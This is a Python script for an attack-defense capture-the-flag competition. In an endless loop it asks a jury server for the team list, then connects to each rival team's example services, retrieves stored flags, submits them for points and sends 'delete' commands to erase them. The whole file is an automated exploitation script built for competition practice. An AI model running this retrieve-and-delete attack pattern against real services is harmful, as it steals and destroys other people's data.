#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Auto detect subnetwork and start attack in whle infiniy
"""

import socket
import os
import sys
import json
import time
import traceback
import requests

if len(sys.argv) < 2:
    sys.exit("Expeceted parameter <juryhost> like 10.10.100.101:8080")

JURYHOST = sys.argv[1]
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
FLAGS_DIR = os.path.join(SCRIPT_DIR, 'flags')


def get_myip():
    """ request jury api """
    url = 'http://' + JURYHOST + '/api/v1/myip'
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.json()["myip"]
    except Exception as err:  # pylint: disable=broad-except
        print("get_myip, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def get_teams():
    """ request jury api """
    url = 'http://' + JURYHOST + '/api/v1/teams'
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.json()['teams']
    except Exception as err:  # pylint: disable=broad-except
        print("get_teams, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def get_scoreboard():
    """ request jury api """
    url = 'http://' + JURYHOST + '/api/v1/scoreboard'
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except Exception as err:  # pylint: disable=broad-except
        print("get_scoreboard, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def send_flag(your_teamnum, flag):
    """ request jury api """
    url = 'http://' + JURYHOST + '/flag'
    url += '?teamid=' + str(your_teamnum)
    url += '&flag=' + flag
    try:
        resp = requests.get(url, timeout=5)
        print("Try send flag " + flag)
        ret = "?"
        if resp.status_code != 200:
            ret = "FAIL " + resp.text
        else:
            ret = "OK " + resp.text
        print(ret)
        return ret
    except Exception as err:  # pylint: disable=broad-except
        print("send_flag, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def delete_flag(ip_address, port, flag_id):
    """ request service api """
    try:
        # print("try connect " + host + ":" + str(port))
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.settimeout(1)
        _socket.connect((ip_address, port))
        _socket.recv(1024).decode("utf-8")
        # print(result)
        _socket.send("delete\n".encode())
        _socket.recv(1024).decode("utf-8")
        _socket.send(str(flag_id + "\n").encode())
        _socket.recv(1024).decode("utf-8")
        _socket.close()
    except socket.timeout:
        print("delete_flag, socket.timeout")
    except socket.error as serr:
        print("delete_flag", str(serr))
    except Exception as err:  # pylint: disable=broad-except
        print("delete_flag", str(err))
        print(traceback.format_exc())
    return ''


def get_flag(ip_address, port, flag_id):
    """ request service api """
    try:
        # print("try connect " + host + ":" + str(port))
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.settimeout(1)
        _socket.connect((ip_address, port))
        result = _socket.recv(1024).decode("utf-8")
        # print(result)
        _socket.send("get\n".encode())
        result = _socket.recv(1024).decode("utf-8")
        _socket.send(str(flag_id + "\n").encode())
        result = _socket.recv(1024).decode("utf-8")
        flag2 = result.strip()
        flag2 = flag2.split("FOUND FLAG: ")
        if len(flag2) == 2:
            flag2 = flag2[1]
        else:
            flag2 = ''
        _socket.close()
        return flag2
    except socket.timeout:
        print("get_flag, socket.timeout")
    except socket.error as serr:
        print("get_flag,", str(serr))
    except Exception as err:  # pylint: disable=broad-except
        print("get_flag,", str(err))
        print(traceback.format_exc())
    return ''


def get_list_flag_ids(ip_address, port):
    """ request service api """
    flag_ids = []
    try:
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.settimeout(0.2)
        _socket.connect((ip_address, port))
        result = _socket.recv(1024).decode("utf-8")
        # print(result)
        _socket.send("list\n".encode())
        result = ""
        result1 = _socket.recv(1024).decode("utf-8")
        while result1.strip() != "":
            result1 = _socket.recv(1024).decode("utf-8")
            if result1.strip() == "":
                break
            result = result + result1
        _socket.close()

        result = result.split('\n')
        for i in result:
            if i == '':
                continue
            flag_id = i.split(":")[1].strip()
            flag_ids.append(flag_id)
    except socket.timeout:
        print("get_list_flag_ids, Socket timeout")
    except socket.error as serr:
        print("get_list_flag_ids, socket.error", serr)
    except Exception as err:  # pylint: disable=broad-except
        print("get_list_flag_ids, Exception", str(err))
        print(traceback.format_exc())
    return flag_ids


def start_exploit(your_teamnum, ip_address, port):
    """ start exploit to specific servce """
    # print("Start attack to (" + ip_address + ":" + str(port) + ")")
    flag_ids = get_list_flag_ids(ip_address, port)

    prev_flags = {}
    if not os.path.isdir(FLAGS_DIR):
        os.mkdir(FLAGS_DIR)
    filename = os.path.join(FLAGS_DIR, "found_flags.json")
    if os.path.isfile(filename):
        with open(filename, "r") as _file:
            prev_flags = json.load(_file)

    for flag_id in flag_ids:
        flag = get_flag(ip_address, port, flag_id)
        if flag in prev_flags:
            continue
        print(flag_id + ": " + flag)
        if flag != '':
            ret = send_flag(your_teamnum, flag)
            if ret is not None:
                prev_flags[flag] = ret
                delete_flag(ip_address, port, flag_id)

    with open(filename, 'w', encoding='utf-8') as _file:
        json.dump(prev_flags, _file, ensure_ascii=False, indent=4)


SERVICES_PORTS = {
    'example_service1': 4101,
    'example_service2': 4102,
    'example_service3': 4103,
    'example_service4': 4104,
    'example_service5': 4105,
    'example_service6': 4106,
}

while True:
    # print("get list of teams")
    teams = get_teams()
    if teams is None:
        time.sleep(5)
        continue

    myip = get_myip()
    SUBNETWORK = ".".join(myip.split(".")[:-1]) + "."
    # print("my ip = ", myip)
    # print("my subnetwork = " + SUBNETWORK + "0/24")

    FOUND_TEAM = None
    found_teams = []
    for team in teams:
        # print(team['ip_address'])
        if team['ip_address'].startswith(SUBNETWORK):
            found_teams.append(team)

    if len(found_teams) == 1:
        # print("Found team by subnetwork")
        FOUND_TEAM = found_teams[0]
    else:
        for team in found_teams:
            if team['ip_address'] == myip:
                # print("Found team by ip")
                FOUND_TEAM = team

    if not FOUND_TEAM:
        print("ERROR: Could not detect team number - please hardcode")
        time.sleep(5)
        continue

    my_teamid = FOUND_TEAM['id']

    # print("your team is " + my_teamid)
    scoreboard = get_scoreboard()
    if scoreboard is None:
        time.sleep(5)
        continue

    ATTACKED_SERVICES = 0
    for team in teams:
        # print(team)
        team_id = team['id']
        team_name = team['name']
        team_ip_address = team['ip_address']
        team_scoreboard = scoreboard['scoreboard'][team_id]['ts_sta']
        # print(team_scoreboard.keys())

        if team_id != my_teamid:
            # print (" >>>> it's your time " + team_name + " now  <<<< ")
            for serviceid, servioceport in SERVICES_PORTS.items():
                if team_scoreboard[serviceid]['status'] != 'down':
                    ATTACKED_SERVICES += 1
                    start_exploit(my_teamid, team_ip_address, servioceport)
    if ATTACKED_SERVICES < 6:
        time.sleep(10)
